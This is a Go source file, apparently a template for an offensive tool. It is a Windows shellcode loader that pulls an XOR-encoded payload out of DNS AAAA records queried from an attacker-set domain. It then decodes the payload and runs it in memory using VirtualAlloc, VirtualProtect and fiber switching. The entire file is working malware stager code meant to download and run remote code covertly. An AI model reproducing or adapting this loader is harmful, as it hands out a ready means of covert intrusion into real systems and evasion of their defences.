package main

import (
	"encoding/hex"
	"unsafe"

	"net"
	"strconv"
	"strings"
  "time"

	"github.com/miekg/dns"
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

// FullIPv6 is used to expand IPv6 addresses and add in any omitted zeros or octets
// Taken from https://stackoverflow.com/a/52003106
func FullIPv6(ip net.IP) string {
	dst := make([]byte, hex.EncodedLen(len(ip)))
	_ = hex.Encode(dst, ip)
	return string(dst[0:4]) + ":" +
		string(dst[4:8]) + ":" +
		string(dst[8:12]) + ":" +
		string(dst[12:16]) + ":" +
		string(dst[16:20]) + ":" +
		string(dst[20:24]) + ":" +
		string(dst[24:28]) + ":" +
		string(dst[28:])
}

//The technique used to inject and run the payload was used from this repository https://github.com/Ne0nd0g/go-shellcode
func runShellcode(hexShellcode string) {

	shellcode, _ := hex.DecodeString(hexShellcode)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, _ := ConvertThreadToFiber.Call()

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	fiber, _, _ := CreateFiber.Call(0, addr, 0)

	SwitchToFiber.Call(fiber)

	SwitchToFiber.Call(fiberAddr)
}

func retreiveShellcodeAsBytes() []byte {

	//You can replace the DNS servers used to retreive the shell code, where you can define them in the format "nameserver <ip>" and separated using \n
	reader := strings.NewReader("nameserver 8.8.8.8\nnameserver 8.8.4.4")
	dnsConfig, _ := dns.ClientConfigFromReader(reader)
	dnsClient := new(dns.Client)
	var dnsRecords []string

	i := 0
	// This will increment through the AAAA records until it cannot find any addiitonal records
	for {
		dnsMessage := new(dns.Msg)
    dnsMessage.SetQuestion(dns.Fqdn("{PREFIX}"+strconv.Itoa(i)+".{DOMAIN}"), dns.TypeAAAA)
		dnsMessage.RecursionDesired = true
		dnsResponse, _, _ := dnsClient.Exchange(dnsMessage, net.JoinHostPort(dnsConfig.Servers[0], dnsConfig.Port))

		if len(dnsResponse.Answer) < 1 {
			break
		}

		ipv6Addr := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
		dnsRecords = append(dnsRecords, ipv6Addr)
 		time.Sleep({SLEEP} * 1000 * time.Millisecond)
		i++
	}

	//Expand the retrieved DNS records to the full length of the octets and address
	var expandedDNSRecords []string
	for _, dnsRecord := range dnsRecords {
		expandedDNSRecords = append(expandedDNSRecords, FullIPv6(net.ParseIP(dnsRecord)))
	}

	//Join all the octets from all the records to prepare it for decoding
	encodedShellcode := ""
	for _, dnsRecord := range expandedDNSRecords {
		encodedShellcode = encodedShellcode + strings.Replace(dnsRecord, ":", "", -1)
	}

	//Remove any trailing zeros at the end of the last address
	encodedShellcode = strings.TrimRight(encodedShellcode, "0")

	//If the length of the shellcode is odd, add a zero to make it even
	if len(encodedShellcode)%2 != 0 {
		encodedShellcode = encodedShellcode + "0"
	}

	//Decode the shellcode by XORing it with the predefined key
	decodedHex, _ := hex.DecodeString(encodedShellcode)
	decodedBytes := make([]byte, len(decodedHex))
	for i := 0; i < len(decodedHex); i++ {
    decodedBytes[i] = decodedHex[i] ^ {KEY}
	}

	return decodedBytes
}

func retreiveShellcodeAsHex() string {
	decodedShellcodeAsHex := hex.EncodeToString(retreiveShellcodeAsBytes())
	return decodedShellcodeAsHex
}

func main() {
	runShellcode(retreiveShellcodeAsHex())
}
